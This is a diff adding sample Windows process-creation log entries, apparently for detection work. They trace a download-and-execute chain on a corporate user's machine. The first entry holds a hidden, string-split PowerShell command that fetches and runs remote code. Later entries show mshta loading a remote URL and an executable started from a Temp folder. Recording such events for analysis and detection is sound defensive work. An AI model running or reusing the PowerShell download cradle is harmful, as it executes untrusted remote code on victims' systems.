@@ -1,0 +1,20 @@
+UtcTime: 2025-05-13 09:16:01.200
+EventID: 1
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -WindowStyle Hidden -NoProfile -Command "$a='https://2n';$b='o.co/2OArm3';iex(irm ($a+$b))"
+ParentImage: C:\Windows\Explorer.EXE
+User: CORP\hr.user
+
+UtcTime: 2025-05-13 09:16:02.350
+EventID: 1
+Image: C:\Windows\System32\mshta.exe
+CommandLine: "C:\Windows\System32\mshta.exe" "https://2no[.]co/2Od3Q3"
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: CORP\hr.user
+
+UtcTime: 2025-05-13 09:16:08.010
+EventID: 1
+Image: C:\Users\hr.user\AppData\Local\Temp\afc_1234\AF1.exe
+CommandLine: "C:\Users\hr.user\AppData\Local\Temp\afc_1234\AF1.exe"
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: CORP\hr.user
